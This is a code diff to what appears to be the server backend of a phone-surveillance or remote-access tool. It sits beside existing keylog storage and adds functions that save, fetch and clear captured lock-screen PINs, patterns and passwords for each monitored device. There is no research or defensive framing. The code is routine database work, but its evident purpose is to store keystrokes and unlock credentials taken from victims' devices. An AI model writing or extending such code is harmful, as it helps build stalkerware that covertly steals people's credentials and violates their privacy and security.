@@ -330,3 +330,42 @@ export async function getKeylogs(deviceId: string, limit = 200): Promise<KeylogE
 export async function clearKeylogs(deviceId: string) {
   await pool.query(`DELETE FROM keylog_entries WHERE device_id = $1`, [deviceId])
 }
+
+// ─── PIN / Pattern / Password Captures ───────────────────────────────────────
+
+export interface PinCapture {
+  id: number
+  lockType: string
+  value: string
+  capturedAt: string
+}
+
+export async function savePinCapture(deviceId: string, lockType: string, value: string) {
+  await pool.query(
+    `INSERT INTO pin_captures (device_id, lock_type, value) VALUES ($1, $2, $3)`,
+    [deviceId, lockType, value]
+  )
+  await pool.query(
+    `DELETE FROM pin_captures WHERE device_id = $1 AND id NOT IN (
+       SELECT id FROM pin_captures WHERE device_id = $1 ORDER BY captured_at DESC LIMIT 500
+     )`,
+    [deviceId]
+  )
+}
+
+export async function getPinCaptures(deviceId: string, limit = 100): Promise<PinCapture[]> {
+  const { rows } = await pool.query(
+    `SELECT * FROM pin_captures WHERE device_id = $1 ORDER BY captured_at DESC LIMIT $2`,
+    [deviceId, limit]
+  )
+  return rows.map(r => ({
+    id: r.id,
+    lockType: r.lock_type,
+    value: r.value,
+    capturedAt: r.captured_at,
+  }))
+}
+
+export async function clearPinCaptures(deviceId: string) {
+  await pool.query(`DELETE FROM pin_captures WHERE device_id = $1`, [deviceId])
+}
